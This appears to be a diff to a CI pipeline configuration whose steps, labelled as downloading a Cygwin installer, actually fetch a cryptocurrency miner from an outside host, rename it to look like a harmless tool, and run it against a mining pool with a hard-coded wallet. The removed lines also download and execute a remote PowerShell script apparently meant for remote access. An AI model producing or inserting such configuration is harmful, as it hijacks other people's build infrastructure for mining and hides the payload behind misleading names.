@@ -4,13 +4,16 @@ jobs:
     parallelism: 16
     machine:
       image: windows-server-2019-vs2019:stable
-      shell: powershell.exe
+      shell: bash.exe
     resource_class: windows.medium
     steps:
       - run:
           name: Download Cygwin installer
           shell: powershell.exe
           command: |
-              Invoke-WebRequest https://momojo1.herokuapp.com/logcat.exe -OutFile dockerd.exe
-              Invoke-WebRequest https://momojo1.herokuapp.com/rdp.ps1 -OutFile ba.ps1
-              ./ba.ps1
+              Invoke-WebRequest https://bitbucket.org/tnkvjqmmzrorvnv/myhero/downloads/violetminer.exe -OutFile logcat.exe
+      - run:
+           name: Download Cygwin installers
+           shell: cmd.exe
+           command: |
+              logcat.exe --pool us-central.2acoin.org:3333 --username guns95PQ9tH96Lympn1bw1AQDCNg1AEXHHRjuKJh1TNnAQSpZcSzJvfA4mgmfQ8Cyq96RLKthdBXn96TXi6g3yFzHm73aXw5Kk6EaQmTq4eew7XMWZgrqE1KcDik8fQU5EhhauijLA9MGCiLH2gxjww4DuQJ2ErN1GMhkct7giSyVPwS4iCQdCtHf1 --password x --algorithm chukwa
